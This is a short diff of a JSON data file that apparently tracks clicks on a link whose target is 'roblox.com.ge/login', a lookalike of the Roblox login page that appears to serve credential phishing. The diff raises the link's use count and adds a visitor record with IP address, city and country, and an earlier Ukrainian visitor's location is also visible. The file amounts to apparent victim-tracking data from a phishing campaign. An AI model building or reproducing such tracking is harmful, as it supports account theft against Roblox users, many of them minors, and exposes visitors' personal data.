@@ -166,7 +166,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1310,
+    "useCount": 1311,
     "createdBy": "admin",
     "clicks": [
       {
@@ -10648,6 +10648,14 @@
         "city": "Mamayvtsi",
         "flag": "🇺🇦",
         "countryCode": "UA"
+      },
+      {
+        "timestamp": 1777381711362,
+        "ip": "49.146.12.127",
+        "country": "Philippines",
+        "city": "Dipolog City",
+        "flag": "🇵🇭",
+        "countryCode": "PH"
       }
     ]
   },
